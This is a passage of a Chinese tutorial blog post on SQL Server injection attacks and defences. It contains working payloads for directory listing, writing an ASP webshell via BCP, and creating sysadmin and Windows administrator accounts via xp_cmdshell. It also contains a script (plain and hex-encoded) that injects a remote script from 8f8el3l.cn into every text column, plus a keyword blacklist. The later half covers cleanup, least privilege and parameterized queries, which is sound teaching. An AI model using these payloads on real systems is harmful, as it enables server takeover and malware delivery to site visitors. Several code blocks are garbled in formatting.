+<p>;insert into temp(id) exec master.dbo.xp_subdirs ‘c:\’;–</p>
+
+<p>c) 利用 xp_dirtree 可以获得“所有”子目录的目录树结构,并存入 temp 表中</p>
+
+<p>;insert into temp(id,num1) exec master.dbo.xp_dirtree ‘c:\’;– （实验成功）</p>
+
+<p>d) 利用 bcp 命令将表内容导成文件</p>
+
+<p>即插入木马文本，然后导出存为文件。比如导出为 asp 文件，然后通过浏览器访问该文件并执行恶意脚本。（使用该命令必须启动’ xp_cmdshell’）</p>
+
+<p>Exec master..xp_cmdshell N’BCP “select * from SchoolMarket.dbo.GoodsStoreData;” queryout c:/inetpub/wwwroot/runcommand.asp -w -S”localhost” -U”sa” -P”123”’</p>
+
+<p>(注意：语句中使用的是双引号，另外表名格式为“数据库名.用户名.表名”)</p>
+
+<p>在 sql 查询器中通过语句：Exec master..xp_cmdshell N’BCP’即可查看 BCP 相关参数，如图：</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201211/201211080214126330.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201211/201211080214125740.png" alt="image" title="image" /></a></p>
+
+<ol>
+  <li>查询当前用户的数据库权限</li>
+</ol>
+
+<p>MSSQL 中一共存在 8 种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。</p>
+
+<p>可通过 1=(select IS_SRVROLEMEMBER(‘sysadmin’))得到当前用户是否具有该权限。</p>
+
+<ol>
+  <li>设置新的数据库帐户（得到 MSSQL 管理员账户）</li>
+</ol>
+
+<p>d) 在数据库内添加一个 hax 用户，默认密码是空</p>
+
+<p>;exec sp_addlogin’hax’;–</p>
+
+<p>e) 给 hax 设置密码 (null 是旧密码，password 是新密码，user 是用户名)</p>
+
+<p>;exec master.dbo.sp_password null,password,username;–</p>
+
+<p>f) 将 hax 添加到 sysadmin 组</p>
+
+<p>;exec master.dbo.sp_addsrvrolemember ‘hax’ ,’sysadmin’;–</p>
+
+<ol>
+  <li>xp_cmdshell MSSQL 存储过程（得到 WINDOWS 管理员账户 ）</li>
+</ol>
+
+<p>通过(5)获取到 sysadmin 权限的帐户后，使用查询分析器连接到数据库，可通过 xp_cmdshell 运行系统命令行（必须是 sysadmin 权限），即使用 cmd.exe 工具，可以做什么自己多了解下。</p>
+
+<p>下面我们使用 xp_cmdshell 来创建一个 Windows 用户，并开启远程登录服务：</p>
+
+<p>a) 判断 xp_cmdshell 扩展存储过程是否存在</p>
+
+<p>SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = ‘X’ AND name =’xp_cmdshell’</p>
+
+<p>b) 恢复 xp_cmdshell 扩展存储过程</p>
+
+<p>Exec master.dbo.sp_addextendedproc ‘xp_cmdshell’,’e:\inetput\web\xplog70.dll’;</p>
+
+<p>开启后使用 xp_cmdshell 还会报下面错误：</p>
+
+<p>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的过程 ‘sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。</p>
+
+<p>通过执行下面语句进行设置：</p>
+
+<p>-- 允许配置高级选项</p>
+
+<p>EXEC sp_configure ‘show advanced options’, 1</p>
+
+<p>GO</p>
+
+<p>-- 重新配置</p>
+
+<p>RECONFIGURE</p>
+
+<p>GO</p>
+
+<p>-- 启用 xp_cmdshell</p>
+
+<p>EXEC sp_configure ‘xp_cmdshell’, 0</p>
+
+<p>GO</p>
+
+<p>–重新配置</p>
+
+<p>RECONFIGURE</p>
+
+<p>GO</p>
+
+<p>c) 禁用 xp_cmdshell 扩展存储过程</p>
+
+<p>Exec master.dbo.sp_dropextendedproc ‘xp_cmdshell’;</p>
+
+<p>d) 添加 windows 用户：</p>
+
+<p>Exec xp_cmdshell ‘net user awen /add’;</p>
+
+<p>e) 设置好密码：</p>
+
+<p>Exec xp_cmdshell ‘net user awen password’;</p>
+
+<p>f) 提升到管理员：</p>
+
+<p>Exec xp_cmdshell ‘net localgroup administrators awen /add’;</p>
+
+<p>g) 开启 telnet 服务：</p>
+
+<p>Exec xp_cmdshell ‘net start tlntsvr’</p>
+
+<ol>
+  <li>没有 xp_cmdshell 扩展程序，也可创建 Windows 帐户的办法.</li>
+</ol>
+
+<p>(本人 windows7 系统，测试下面 SQL 语句木有效果)</p>
+
+<p>declare @shell int ;</p>
+
+<p>execsp_OAcreate ‘w script .shell’,@shell output ;</p>
+
+<p>execsp_OAmethod @shell,’run’,null,’C:\Windows\System32\cmd.exe /c net user awen /add’;</p>
+
+<p>execsp_OAmethod @shell,’run’,null,’C:\Windows\System32\cmd.exe /c net user awen 123’;</p>
+
+<p>execsp_OAmethod @shell,’run’,null,’C:\Windows\System32\cmd.exe /c net localgroup administrators awen /add’;</p>
+
+<p>在使用的时候会报如下错：</p>
+
+<p>SQL Server 阻止了对组件 ‘Ole Automation Procedures’ 的过程 ‘sys.sp_OACreate’、’sys.sp_OAMethod’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘Ole Automation Procedures’。有关启用 ‘Ole Automation Procedures’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。</p>
+
+<p>解决办法：</p>
+
+<p>sp_configure ‘show advanced options’, 1;</p>
+
+<p>GO</p>
+
+<p>RECONFIGURE;</p>
+
+<p>GO</p>
+
+<p>sp_configure ‘Ole Automation Procedures’, 1;</p>
+
+<p>GO</p>
+
+<p>RECONFIGURE;</p>
+
+<p>GO</p>
+
+<p>好了，这样别人可以登录你的服务器了，你怎么看？</p>
+
+<ol>
+  <li>客户端脚本攻击</li>
+</ol>
+
+<p>攻击 1：（正常输入）攻击者通过正常的输入提交方式将恶意脚本提交到数据库中，当其他用户浏览此内容时就会受到恶意脚本的攻击。</p>
+
+<p>措施：转义提交的内容，.NET 中可通过 System.Net.WebUtility.HtmlEncode(string) 方法将字符串转换为 HTML 编码的字符串。</p>
+
+<p>攻击 2：（SQL 注入）攻击者通过 SQL 注入方式将恶意脚本提交到数据库中，直接使用 SQL 语法 UPDATE 数据库，为了跳过 System.Net.WebUtility.HtmlEncode(string) 转义，攻击者会将注入 SQL 经过“HEX 编码”，然后通过 exec 可以执行“动态”SQL 的特性运行脚本”。</p>
+
+<p>参考：</p>
+
+<p>注入：<a href="http://www.cnblogs.com/ryu666/archive/2009/07/28/1533248.html">SQL 注入案例曝光，请大家提高警惕</a></p>
+
+<p>恢复：<a href="http://blog.sina.com.cn/s/blog_5e5d98b50100dlz9.html">批量清除数据库中被植入的 js</a></p>
+
+<p>示例代码：（可在示例附带的数据库测试）</p>
+
+<p>a) 向当前数据库的每个表的每个字段插入一段恶意脚本</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p>11</p>
+
+<p>12</p>
+
+<p>13</p>
+
+<p><code class="highlighter-rouge">Declare</code> <code class="highlighter-rouge">@T</code> ` Varchar<code class="highlighter-rouge">(255),@C ` ` Varchar</code>(255) `</p>
+
+<p><code class="highlighter-rouge">Declare</code> <code class="highlighter-rouge">Table_Cursor</code> <code class="highlighter-rouge">Cursor</code> <code class="highlighter-rouge">For</code></p>
+
+<p><code class="highlighter-rouge">Select</code> ` A.<code class="highlighter-rouge">Name</code>,B.``Name `</p>
+
+<p><code class="highlighter-rouge">From</code> <code class="highlighter-rouge">SysobjectsA,Syscolumns B</code> <code class="highlighter-rouge">Where</code> <code class="highlighter-rouge">A.Id=B.Id</code> <code class="highlighter-rouge">And</code> ` A.Xtype=``‘u’ ` <code class="highlighter-rouge">And</code> <code class="highlighter-rouge">(B.Xtype=99</code> <code class="highlighter-rouge">Or</code> <code class="highlighter-rouge">B.Xtype=35</code> <code class="highlighter-rouge">Or</code> <code class="highlighter-rouge">B.Xtype=231</code> <code class="highlighter-rouge">Or</code> <code class="highlighter-rouge">B.Xtype=167)</code></p>
+
+<p><code class="highlighter-rouge">Open</code> <code class="highlighter-rouge">Table_Cursor</code></p>
+
+<p><code class="highlighter-rouge">Fetch</code> <code class="highlighter-rouge">Next</code> <code class="highlighter-rouge">From</code>  <code class="highlighter-rouge">Table_Cursor</code> <code class="highlighter-rouge">Into</code> <code class="highlighter-rouge">@T,@C</code></p>
+
+<p><code class="highlighter-rouge">While(@@Fetch_Status=0)</code></p>
+
+<p><code class="highlighter-rouge">Begin</code></p>
+
+<p><code class="highlighter-rouge"> Exec</code><code class="highlighter-rouge">(</code><code class="highlighter-rouge">'update ['</code><code class="highlighter-rouge">+@T+</code><code class="highlighter-rouge">'] Set ['</code><code class="highlighter-rouge">+@C+</code><code class="highlighter-rouge">']=Rtrim(Convert(Varchar(8000),['</code><code class="highlighter-rouge">+@C+</code><code class="highlighter-rouge">']))+'</code><code class="highlighter-rouge">'&lt;script src=[http://8f8el3l.cn/0.js&gt;&lt;/script](http://8f8el3l.cn/0.js&gt;&lt;/script)&gt;'</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">) </code></p>
+
+<p><code class="highlighter-rouge">Fetch</code> <code class="highlighter-rouge">Next</code> <code class="highlighter-rouge">From</code> <code class="highlighter-rouge">Table_Cursor</code> <code class="highlighter-rouge">Into</code> <code class="highlighter-rouge">@T,@C</code></p>
+
+<p><code class="highlighter-rouge">End</code></p>
+
+<p><code class="highlighter-rouge">Close</code> <code class="highlighter-rouge">Table_Cursor</code></p>
+
+<p><code class="highlighter-rouge">DeallocateTable_Cursor</code></p>
+
+<p>b) 更高级的攻击，将上面的注入 SQL 进行“HEX 编码”，从而避免程序的关键字检查、脚本转义等，通过 EXEC 执行</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p><code class="highlighter-rouge">dEcLaRe</code> <code class="highlighter-rouge">@s</code> ` vArChAr``(8000) ` <code class="highlighter-rouge">sEt</code> <code class="highlighter-rouge">@s=0x4465636c617265204054205661726368617228323535292c4043205661726368617228323535290d0a4465636c617265205461626c655f437572736f7220437572736f7220466f722053656c65637420412e4e616d652c422e4e616d652046726f6d205379736f626a6563747320412c537973636f6c756d6e73204220576865726520412e49643d422e496420416e6420412e58747970653d27752720416e642028422e58747970653d3939204f7220422e58747970653d3335204f7220422e58747970653d323331204f7220422e58747970653d31363729204f70656e205461626c655f437572736f72204665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c4043205768696c6528404046657463685f5374617475733d302920426567696e20457865632827757064617465205b272b40542b275d20536574205b272b40432b275d3d527472696d28436f6e7665727428566172636861722838303030292c5b272b40432b275d29292b27273c736372697074207372633d687474703a2f2f386638656c336c2e636e2f302e6a733e3c2f7363726970743e272727294665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c404320456e6420436c6f7365205461626c655f437572736f72204465616c6c6f63617465205461626c655f437572736f72;</code></p>
+
+<p><code class="highlighter-rouge"> eXeC</code><code class="highlighter-rouge">(@s);</code><code class="highlighter-rouge">-- </code></p>
+
+<p>c) 批次删除数据库被注入的脚本</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p>11</p>
+
+<p>12</p>
+
+<p>13</p>
+
+<p>14</p>
+
+<p>15</p>
+
+<p>16</p>
+
+<p>17</p>
+
+<p>18</p>
+
+<p>19</p>
+
+<p>20</p>
+
+<p>21</p>
+
+<p>22</p>
+
+<p>23</p>
+
+<p>24</p>
+
+<p>25</p>
+
+<p>26</p>
+
+<p>27</p>
+
+<p>28</p>
+
+<p>29</p>
+
+<p>30</p>
+
+<p>31</p>
+
+<p>32</p>
+
+<p>33</p>
+
+<p>34</p>
+
+<p>35</p>
+
+<p>36</p>
+
+<p>37</p>
+
+<p>38</p>
+
+<p>39</p>
+
+<p>40</p>
+
+<p>41</p>
+
+<p>42</p>
+
+<p>43</p>
+
+<p>44</p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">@delStrnvarchar(500)</code></p>
+
+<p><code class="highlighter-rouge">set</code> ` @delStr=``‘&lt;script src=<a href="http://8f8el3l.cn/0.js&gt;&lt;/script">http://8f8el3l.cn/0.js&gt;&lt;/script</a>&gt;’ ` <code class="highlighter-rouge">--要被替换掉字符</code></p>
+
+<p><code class="highlighter-rouge">setnocount</code> <code class="highlighter-rouge">on</code></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">@tableNamenvarchar(100),@columnNamenvarchar(100),@tbIDint,@iRowint,@iResultint</code></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">@sqlnvarchar(500)</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@iResult=0</code></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">cur</code> <code class="highlighter-rouge">cursor</code> <code class="highlighter-rouge">for</code></p>
+
+<p><code class="highlighter-rouge">selectname,id</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">sysobjects</code> <code class="highlighter-rouge">where</code> ` xtype=``‘U’ `</p>
+
+<p><code class="highlighter-rouge">open</code> <code class="highlighter-rouge">cur</code></p>
+
+<p><code class="highlighter-rouge">fetch</code> <code class="highlighter-rouge">next</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">cur</code> <code class="highlighter-rouge">into</code> <code class="highlighter-rouge">@tableName,@tbID</code></p>
+
+<p><code class="highlighter-rouge">while @@fetch_status=0</code></p>
+
+<p><code class="highlighter-rouge">begin</code></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">cur1</code> <code class="highlighter-rouge">cursor</code> <code class="highlighter-rouge">for</code></p>
+
+<p><code class="highlighter-rouge">--xtype in (231,167,239,175) 为char,varchar,nchar,nvarchar类型</code></p>
+
+<p><code class="highlighter-rouge">select</code> <code class="highlighter-rouge">name</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">syscolumns</code> <code class="highlighter-rouge">where</code> <code class="highlighter-rouge">xtype</code> <code class="highlighter-rouge">in</code> <code class="highlighter-rouge">(231,167,239,175)</code> <code class="highlighter-rouge">and</code> <code class="highlighter-rouge">id=@tbID</code></p>
+
+<p><code class="highlighter-rouge">open</code> <code class="highlighter-rouge">cur1</code></p>
+
+<p><code class="highlighter-rouge">fetch</code> <code class="highlighter-rouge">next</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">cur1</code> <code class="highlighter-rouge">into</code> <code class="highlighter-rouge">@columnName</code></p>
+
+<p><code class="highlighter-rouge">while @@fetch_status=0</code></p>
+
+<p><code class="highlighter-rouge">begin</code></p>
+
+<p><code class="highlighter-rouge">set</code> ` @sql=<code class="highlighter-rouge">'update [' ` `+ @tableName +` ` '] set ['</code>+ @columnName +<code class="highlighter-rouge">']= replace(['</code>+@columnName+<code class="highlighter-rouge">'],'</code>’’<code class="highlighter-rouge">+@delStr+</code>’’<code class="highlighter-rouge">','</code>’’<code class="highlighter-rouge">') where ['</code>+@columnName+<code class="highlighter-rouge">'] like '</code>’%’<code class="highlighter-rouge">+@delStr+</code>’%’``’’ `</p>
+
+<p><code class="highlighter-rouge">execsp_executesql @sql</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@iRow=@@rowcount</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@iResult=@iResult+@iRow</code></p>
+
+<p><code class="highlighter-rouge">if @iRow&gt;0</code></p>
+
+<p><code class="highlighter-rouge">begin</code></p>
+
+<p><code class="highlighter-rouge">print</code> ` ‘表：’<code class="highlighter-rouge">+@tableName+</code>‘,列:’<code class="highlighter-rouge">+@columnName+</code>‘被更新’<code class="highlighter-rouge">+</code>convert<code class="highlighter-rouge">(</code>varchar<code class="highlighter-rouge">(10),@iRow)+</code>‘条记录;’ `</p>
+
+<p><code class="highlighter-rouge">end</code></p>
+
+<p><code class="highlighter-rouge">fetch</code> <code class="highlighter-rouge">next</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">cur1</code> <code class="highlighter-rouge">into</code> <code class="highlighter-rouge">@columnName</code></p>
+
+<p><code class="highlighter-rouge">end</code></p>
+
+<p><code class="highlighter-rouge">close</code> <code class="highlighter-rouge">cur1</code></p>
+
+<p><code class="highlighter-rouge">deallocate</code> <code class="highlighter-rouge">cur1</code></p>
+
+<p><code class="highlighter-rouge">fetch</code> <code class="highlighter-rouge">next</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">cur</code> <code class="highlighter-rouge">into</code> <code class="highlighter-rouge">@tableName,@tbID</code></p>
+
+<p><code class="highlighter-rouge">end</code></p>
+
+<p><code class="highlighter-rouge">print</code> ` ‘数据库共有’<code class="highlighter-rouge">+</code>convert<code class="highlighter-rouge">(</code>varchar<code class="highlighter-rouge">(10),@iResult)+</code>‘条记录被更新!!!’ `</p>
+
+<p><code class="highlighter-rouge">close</code> <code class="highlighter-rouge">cur</code></p>
+
+<p><code class="highlighter-rouge">deallocate</code> <code class="highlighter-rouge">cur</code></p>
+
+<p><code class="highlighter-rouge">setnocount</code> <code class="highlighter-rouge">off</code></p>
+
+<p>d) 我如何得到“HEX 编码”？</p>
+
+<p>开始不知道 HEX 是什么东西，后面查了是“十六进制”，网上已经给出两种转换方式：（注意转换的时候不要加入十六进制的标示符 ’0x’ ）</p>
+
+<p>Ø <a href="http://home.paulschou.net/tools/xlate/">在线转换 （TRANSLATOR, BINARY），进入……</a></p>
+
+<p>Ø <a href="http://hi.baidu.com/bopdawpdarbenxq/item/4be36d83d7937356e63d19c5">C#版的转换，进入……</a></p>
+
+<ol>
+  <li>对于敏感词过滤不到位的检查，我们可以结合函数构造 SQL 注入</li>
+</ol>
+
+<p>比如过滤了 update，却没有过滤 declare、exec 等关键词，我们可以使用 reverse 来将倒序的 sql 进行注入：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">@A</code> ` varchar<code class="highlighter-rouge">(200);</code>set ` ` @A=reverse(<code class="highlighter-rouge">''</code>‘58803303431’<code class="highlighter-rouge">'=emanresu erehw '</code>‘9d4d9c1ac9814f08’<code class="highlighter-rouge">'=drowssaP tes xxx tadpu'</code>); `</p>
+
+<p>防止 SQL 注入</p>
+
+<ol>
+  <li>数据库权限控制，只给访问数据库的 web 应用功能所需的最低权限帐户。</li>
+</ol>
+
+<p>如 MSSQL 中一共存在 8 种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。</p>
+
+<ol>
+  <li>自定义错误信息，首先我们要屏蔽服务器的详细错误信息传到客户端。</li>
+</ol>
+
+<p>在 ASP.NET 中，可通过 web.config 配置文件的<customErrors>节点设置：</customErrors></p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p><code class="highlighter-rouge"> &lt;</code><code class="highlighter-rouge">customErrors </code> <code class="highlighter-rouge">defaultRedirect="url" mode="On|Off|RemoteOnly"&gt;</code></p>
+
+<p><code class="highlighter-rouge"> &lt;</code><code class="highlighter-rouge">error. </code> <code class="highlighter-rouge">. ./&gt;</code></p>
+
+<p><code class="highlighter-rouge"> &lt;/</code><code class="highlighter-rouge">customErrors</code><code class="highlighter-rouge">&gt; </code></p>
+
+<p><a href="http://msdn.microsoft.com/zh-cn/library/h0hfz6fc(v=vs.80).aspx">更详细，请进入……</a></p>
+
+<p>mode：指定是启用或禁用自定义错误，还是仅向远程客户端显示自定义错误。</p>
+
+<p>On</p>
+
+<p>指定启用自定义错误。如果未指定 defaultRedirect，用户将看到一般性错误。</p>
+
+<p>Off</p>
+
+<p>指定禁用自定义错误。这允许显示标准的详细错误。</p>
+
+<p>RemoteOnly</p>
+
+<p>指定仅向远程客户端显示自定义错误并且向本地主机显示 ASP.NET 错误。这是默认值。</p>
+
+<p>看下效果图：</p>
+
+<p>设置为<customErrors mode="On">一般性错误：</customErrors></p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922122276.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922155916.png" alt="image" title="image" /></a></p>
+
+<p>设置为<customErrors mode="Off">：</customErrors></p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922188617.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922238089.png" alt="image" title="image" /></a></p>
+
+<ol>
+  <li>把危险的和不必要的存储过程删除</li>
+</ol>
+
+<p>xp_：扩展存储过程的前缀，SQL 注入攻击得手之后，攻击者往往会通过执行 xp_cmdshell 之类的扩展存储过程，获取系统信息，甚至控制、破坏系统。</p>
+
+<p>xp_cmdshell</p>
+
+<p>能执行 dos 命令，通过语句 sp_dropextendedproc 删除，</p>
+
+<p>不过依然可以通过 sp_addextendedproc 来恢复，因此最好删除或改名 xplog70.dll（sql server 2000、windows7）</p>
+
+<p>xpsql70.dll(sqlserer 7.0)</p>
+
+<p>xp_fileexist</p>
+
+<p>用来确定一个文件是否存在</p>
+
+<p>xp_getfiledetails</p>
+
+<p>可以获得文件详细资料</p>
+
+<p>xp_dirtree</p>
+
+<p>可以展开你需要了解的目录，获得所有目录深度</p>
+
+<p>Xp_getnetname</p>
+
+<p>可以获得服务器名称</p>
+
+<p>Xp_regaddmultistring</p>
+
+<p>Xp_regdeletekey</p>
+
+<p>Xp_regdeletevalue</p>
+
+<p>Xp_regenumvalues</p>
+
+<p>Xp_regread</p>
+
+<p>Xp_regremovemultistring</p>
+
+<p>Xp_regwrite</p>
+
+<p>可以访问注册表的存储过程</p>
+
+<p>Sp_OACreate</p>
+
+<p>Sp_OADestroy</p>
+
+<p>Sp_OAGetErrorInfo</p>
+
+<p>Sp_OAGetProperty</p>
+
+<p>Sp_OAMethod</p>
+
+<p>Sp_OASetProperty</p>
+
+<p>Sp_OAStop</p>
+
+<p>如果你不需要请丢弃 OLE 自动存储过程</p>
+
+<ol>
+  <li>非参数化 SQL 与参数化 SQL</li>
+</ol>
+
+<p>1) 非参数化（动态拼接 SQL）</p>
+
+<p>a) 检查客户端脚本：若使用.net，直接用 System.Net.WebUtility.HtmlEncode(string)将输入值中包含的<a href="http://www.cnblogs.com/rpoplar/archive/2012/08/03/2621409.html">《HTML 特殊转义字符》</a>转换掉。</p>
+
+<p>b) 类型检查：对接收数据有明确要求的，在方法内进行类型验证。如数值型用 int.TryParse()，日期型用 DateTime.TryParse() ，只能用英文或数字等。</p>
+
+<p>c) 长度验证：要进行必要的注入，其语句也是有长度的。所以如果你原本只允许输入 10 字符，那么严格控制 10 个字符长度，一些注入语句就没办法进行。</p>
+
+<p>d) 使用枚举：如果只有有限的几个值，就用枚举。</p>
+
+<p>e) 关键字过滤：这个门槛比较高，因为各个数据库存在关键字，内置函数的差异，所以对编写此函数的功底要求较高。如公司或个人有积累一个比较好的通用过滤函数还请留言分享下，学习学习，谢谢！</p>
+
+<p>这边提供一个关键字过滤参考方案(MSSQL)：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p>11</p>
+
+<p>12</p>
+
+<p>13</p>
+
+<p>14</p>
+
+<p>15</p>
+
+<p>16</p>
+
+<p>17</p>
+
+<p>18</p>
+
+<p>19</p>
+
+<p><code class="highlighter-rouge">public</code> <code class="highlighter-rouge">static</code> <code class="highlighter-rouge">bool</code> ` ValiParms(``string ` <code class="highlighter-rouge">parms)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">if</code> <code class="highlighter-rouge">(parms ==</code> ` null``) `</p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">return</code> ` false``; `</p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p><code class="highlighter-rouge">Regex regex =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"sp_"</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex2 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"'"</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex3 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"create "</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex4 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"drop "</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex5 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"\""</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex6 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"exec "</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex7 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"xp_"</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex8 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"insert "</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex9 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"delete "</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex10 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"select "</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">Regex regex11 =</code> <code class="highlighter-rouge">new</code> ` Regex(<code class="highlighter-rouge">"update "</code>, RegexOptions.IgnoreCase); `</p>
+
+<p><code class="highlighter-rouge">return</code> <code class="highlighter-rouge">(regex.IsMatch(parms) || (regex2.IsMatch(parms) || (regex3.IsMatch(parms) || (regex4.IsMatch(parms) || (regex5.IsMatch(parms) || (regex6.IsMatch(parms) || (regex7.IsMatch(parms) || (regex8.IsMatch(parms) || (regex9.IsMatch(parms) || (regex10.IsMatch(parms) || (regex11.IsMatch(parms))))))))))));</code></p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p>优点：写法相对简单，网络传输量相对参数化拼接 SQL 小</p>
+
+<p>缺点：</p>
+
+<p>a) 对于关键字过滤，常常“顾此失彼”，如漏掉关键字，系统函数，对于 HEX 编码的 SQL 语句没办法识别等等，并且需要针对各个数据库封装函数。</p>
+
+<p>b) 无法满足需求：用户本来就想发表包含这些过滤字符的数据。</p>
+
+<p>c) 执行拼接的 SQL 浪费大量缓存空间来存储只用一次的查询计划。服务器的物理内存有限，SQLServer 的缓存空间也有限。有限的空间应该被充分利用。</p>
+
+<ol>
+  <li>参数化查询（Parameterized Query）</li>
+</ol>
+
+<p>a) 检查客户端脚本，类型检查，长度验证，使用枚举，明确的关键字过滤这些操作也是需要的。他们能尽早检查出数据的有效性。</p>
+
+<p>b) 参数化查询原理：在使用参数化查询的情况下，数据库服务器不会将参数的内容视为 SQL 指令的一部份来处理，而是在数据库完成 SQL 指令的编译后，才套用参数运行，因此就算参数中含有具有损的指令，也不会被数据库所运行。</p>
+
+<p>c) 所以在实际开发中，入口处的安全检查是必要的，参数化查询应作为最后一道安全防线。</p>
+
+<p>优点：</p>
+
+<p>Ø 防止 SQL 注入(使单引号、分号、注释符、xp_扩展函数、拼接 SQL 语句、EXEC、SELECT、UPDATE、DELETE 等 SQL 指令无效化)</p>
+
+<p>Ø 参数化查询能强制执行类型和长度检查。</p>
+
+<p>Ø 在 MSSQL 中生成并重用查询计划，从而提高查询效率（执行一条 SQL 语句，其生成查询计划将消耗大于 50%的时间）</p>
+
+<p>缺点：</p>
+
+<p>Ø 不是所有数据库都支持参数化查询。目前 Access、SQL Server、MySQL、SQLite、Oracle 等常用数据库支持参数化查询。</p>
+
+<p>疑问：参数化如何“批量更新”数据库。</p>
+
+<p>a) 通过在参数名上增加一个计数来区分开多个参数化语句拼接中的同名参数。</p>
+
+<p>EG：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p><code class="highlighter-rouge"> StringBuilder sqlBuilder=</code><code class="highlighter-rouge">new </code> <code class="highlighter-rouge">StringBuilder(512);</code></p>
+
+<p><code class="highlighter-rouge">Int count=0;</code></p>
+
+<p><code class="highlighter-rouge">For(循环)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">sqlBuilder.AppendFormat(“UPDATE login SET password=@password{0} WHERE username=@userName{0}”,count.ToString());</code></p>
+
+<p><code class="highlighter-rouge"> SqlParameter para=</code><code class="highlighter-rouge">new </code> <code class="highlighter-rouge">SqlParamter(){ParameterName=@password+count.ToString()}</code></p>
+
+<p><code class="highlighter-rouge">……</code></p>
+
